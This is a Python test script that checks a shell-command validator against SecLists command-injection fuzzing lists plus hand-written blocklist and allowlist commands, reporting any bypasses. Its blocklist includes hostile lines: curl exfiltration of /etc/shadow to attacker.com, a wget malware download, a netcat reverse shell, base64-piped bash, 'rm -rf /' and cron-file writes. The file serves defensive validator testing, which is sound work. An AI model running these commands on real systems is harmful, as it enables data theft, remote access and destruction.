import os
import subprocess
import sys
import time
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed

from server.security import CommandValidator

validator = CommandValidator()

GREEN = "\033[1;32m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
RESET = "\033[0m"

PAYLOAD_URL = "https://github.com/danielmiessler/SecLists/archive/refs/heads/master.zip"
CACHE_DIR = os.path.join(os.getcwd(), ".cache", "payloads")
EXTRACT_DIR = os.path.join(CACHE_DIR, "seclists")

# from SecLists
BLOCK_PAYLOAD_FILES = [
    "Fuzzing/command-injection-commix.txt",
    "Fuzzing/command-injection.txt",
    "Fuzzing/bash.txt",
    # "Fuzzing/special-chars.txt",
    "Fuzzing/unix-commands.txt",
    "Fuzzing/wordlist-common.txt",
    # "Discovery/Web-Content/common.txt",
    # "Discovery/Web-Content/big.txt",
    # "Discovery/Web-Content/api/api-endpoints.txt",
    # "Discovery/Web-Content/raft-large-directories.txt",
    # "Discovery/Web-Content/raft-large-files.txt",
    # "Discovery/Web-Content/directory-list-2.3-medium.txt",
    # "Discovery/Web-Content/directory-list-2.3-big.txt",
    # "Miscellaneous/shells.txt",
]

BLOCK_PAYLOADS = [
    "sudo apt update",
    "echo 'BASE64_ENCODED_COMMAND' | base64 -d | bash",
    "cat /etc/shadow",
    "cat /etc/passwd",
    "stat /etc/shadow",
    "curl -X POST -d @/etc/shadow http://attacker.com",
    "wget http://attacker.com/malware.sh",
    "nc -e /bin/bash attacker.com 4444",
    "systemctl status ssh",
    "systemctl restart nginx",
    "service cron restart",
    "nano /tmp/test.txt",
    # "top",  # without -b, this hangs forever
    "kill -9 1234; rm -rf /",
    "echo `cat /etc/shadow`",
    "cat /tmp/test.txt > /etc/cron.d/malicious",
    "cat .env",
    # "echo $HF_TOKEN",
]

ALLOW_PAYLOADS = [
    "grep test file.txt",
    "grep -l file.txt",
    "grep file.txt",
    "echo -l .",
    "echo -l /tmp",
    "cat -la file.txt",
    "env",
    "lsof -p 1234",
    "rm /tmp/suspicious_file",
    "ls -a /tmp",
    "printenv",
    "rm /tmp/exfil_dump.txt",
    "journalctl -u ssh",
    "cat -la hello",
    # "ls -l /etc/shadow",
    "ls -l file.txt",
    "grep -a hello",
    "pwd",
    "df -h",
    "ls -la",
    "iostat",
    "grep -a .",
    "ps aux",
    "echo /tmp",
    "whoami",
    # "systemctl status ssh",
    # "systemctl status nginx",
    "pgrep python",
    "ls -lah /tmp/.persistence",
    "ps aux | grep reverse_shell",
    "cat /etc/crontab",
    "grep .",
    "ps aux | grep python",
    "journalctl -xe",
    "pkill -f suspicious_process",
    "ps -ef",
    "grep sshd /var/log/auth.log",
    "grep -la hello",
    # "ls -l /etc/passwd",
    # "stat /etc/passwd",
    "ls -lah /var/log",
    "lastlog",
    "ls hello",
    "ls -lah /tmp/.config/sudoers.d",
    "cat -la /tmp",
    "ss -tulpn",
    "cat /var/log/syslog",
    "ss -tuln",
    "echo -la hello",
    "netstat -tuln | grep 8000",
    "grep -la .",
    "pgrep -f python",
    "lsof -i :8000",
    "curl http://127.0.0.1:8000",
    "cat /var/log/syslog | grep error",
    "echo -la /tmp",
    "cat /tmp/exfil_dump.txt",
    "grep -l /tmp",
    "ps aux --sort=-%mem",
    "ls -la file.txt",
    "ls -a .",
    "journalctl --since '1 hour ago'",
    "echo $PATH",
    "free -h",
    "echo -la .",
    "ls -l .",
    "cat hello",
    "cat /tmp/.persistence/autostart.sh",
    "echo .",
    "ls /tmp",
    "find /home -name '*.py'",
    "uptime",
    "lsof -i",
    "which python",
    "cat ./data.txt",
    'ps aux | grep "python"',
    "file /usr/bin/python3",
    "netstat -anp",
    "ps auxf",
    "grep -l hello",
    "kill 1234",
    "ip a",
    "grep hello",
    "ip route",
    "cat -l /tmp",
    "netstat -tulpn",
    "crontab -r",
    "echo -l file.txt",
    "md5sum file.txt",
    "grep /tmp",
    "grep -la file.txt",
    "ls -l /tmp",
    "cat .",
    "grep -a file.txt",
    "ls -la /tmp",
    "ls -a file.txt",
    "du -sh .",
    "du -sh /tmp",
    "rm -f /tmp/malware.sh",
    # "stat /etc/shadow",
    "tar -tzf archive.tar.gz",
    "grep -i failed /var/log/auth.log",
    "rm -f /tmp/.config/sudoers.d/backdoor",
    "grep -a /tmp",
    "cat -a .",
    "ls -a hello",
    "which bash",
    "grep -la /tmp",
    "echo file.txt",
    "file /bin/bash",
    "echo hello",
    "cat -a /tmp",
    "ls -la hello",
    "echo 'hello world'",
    "ss -tunap",
    "netstat -tulpn | grep 8080",
    "grep error /var/log/syslog",
    "ls /etc/cron.d",
    "ls file.txt",
    "vmstat",
    "sha256sum file.txt",
    "kill -15 1234",
    "id",
    "pkill -9 -f syslog_monitor",
    "pkill -f reverse_shell",
    "ls .",
    "grep -l .",
    "echo -a file.txt",
    "echo -la file.txt",
    "echo 'test payload'",
    "hostname",
    "cat /tmp",
    "tail -n 50 /var/log/syslog",
    "pkill python",
    "netstat -tuln",
    "cat -a file.txt",
    "ls",
    "find /tmp -name '*.sh'",
    "ps aux --sort=-%cpu",
    "cat file.txt",
    "ls -l hello",
    "cat -l file.txt",
    "cat -l .",
    "cat -la .",
    "find /tmp -type f",
    "lsof -i :8080",
    "crontab -l",
    "tail -f /var/log/syslog",
    "tar -tf archive.tar",
    "find /var -type f -mtime -1",
    "last",
    "echo test",
    "echo -l hello",
    "echo -a /tmp",
    "echo -a hello",
    "who",
    "ps aux | grep suspicious",
    "echo $HOME",
    "cat -l hello",
    "uname -a",
    "rm -f /tmp/.persistence/autostart.sh",
    "echo -a .",
    "date",
    "sleep 1",
    "top -b -n 1",
    "pgrep -f crypto_miner",
    "ls -lah /tmp",
    "ls -la .",
    "cat -a hello",
    "curl -I http://127.0.0.1:8000",
    "pgrep -f server",
    "kill -9 1234",
]

COMMANDS = ["ls", "cat", "echo", "grep"]
FLAGS = ["", "-l", "-a", "-la"]
ARGS = ["file.txt", ".", "/tmp", "hello"]


def generate_allow():
    payloads = []
    for cmd in COMMANDS:
        for flag in FLAGS:
            for arg in ARGS:
                parts = [cmd]
                if flag:
                    parts.append(flag)
                if arg:
                    parts.append(arg)
                payloads.append(" ".join(parts))
    return payloads


def download_payloads():
    """Download on-demand"""
    os.makedirs(CACHE_DIR, exist_ok=True)

    zip_path = os.path.join(CACHE_DIR, "seclists.zip")

    if not os.path.exists(EXTRACT_DIR):
        print(f"{YELLOW}Payloads not found in cache. Downloading...{RESET}")
        print(f"{BLUE}[+] Downloading payloads...{RESET}")

        subprocess.run(["wget", "-O", zip_path, PAYLOAD_URL], check=True)

        print(f"{BLUE}[+] Extracting payloads...{RESET}")
        with zipfile.ZipFile(zip_path, "r") as z:
            z.extractall(CACHE_DIR)

        os.rename(os.path.join(CACHE_DIR, "SecLists-master"), EXTRACT_DIR)
        print(f"{GREEN}Payloads downloaded and extracted to {EXTRACT_DIR}{RESET}")


def validate(cmd: str):
    res = validator.validate(cmd)
    return cmd, res.is_allowed, res.reason


def load_payloads(mode_block: bool = True):
    if not mode_block:
        print(f"{YELLOW}Loading allowlist payloads...{RESET}")
        return ALLOW_PAYLOADS

    # check if file exists, if not download and extract payloads
    if not os.path.exists(EXTRACT_DIR):
        print(f"{YELLOW}Payloads not found. Downloading...{RESET}")
        download_payloads()

    payloads = []
    for file in BLOCK_PAYLOAD_FILES:
        path = os.path.join(EXTRACT_DIR, file)
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        payloads.append(line)

    return payloads + BLOCK_PAYLOADS


def run_sequential(payloads, is_blocklist=True):
    total = len(payloads)
    allowed = 0
    blocked = 0

    start = time.time()

    for i, cmd in enumerate(payloads, 1):
        c, ok, reason = validate(cmd)

        sys.stdout.write(f"\r[{i}/{total}] ")
        sys.stdout.flush()

        if ok:
            allowed += 1
            if is_blocklist:
                print(f"{YELLOW}[BYPASS]{RESET} {c}")
        else:
            blocked += 1
            if not is_blocklist:
                print(f"{RED}[BLOCKED]{RESET} {c} - Reason: {reason}")

    end = time.time()

    print("\n" + "=" * 60)
    print(f"{BLUE}SUMMARY{RESET}")
    print(f"Total   : {total}")
    print(f"Blocked : {blocked}")
    print(f"Allowed : {allowed}")
    print(f"Time    : {end - start:.2f}s")
    print(f"SCORE   : {allowed/total*100:.2f}% (Payloads Allowed)")
    print(
        f"{GREEN}PASS{RESET}"
        if (is_blocklist and blocked == total)
        or (not is_blocklist and allowed == total)
        else f"{RED}FAIL{RESET}"
    )
    print("=" * 60)


if __name__ == "__main__":
    print(f"{BLUE}Loading payloads...{RESET}")
    payloads = load_payloads()

    print(
        f"{BLUE}Loaded {len(payloads)} payloads{RESET}:",
        ", ".join(BLOCK_PAYLOAD_FILES),
    )
    print()

    print(f"{BLUE}" + "~~" * 15, "BLOCKLIST TEST", "~~" * 10, f"{RESET}")
    run_sequential(payloads)
    print()

    print(f"{BLUE}" + "~~" * 10, "ALLOWLIST TEST", "~~" * 10, f"{RESET}")
    allow_payloads = ALLOW_PAYLOADS + generate_allow()
    run_sequential(allow_payloads, is_blocklist=False)
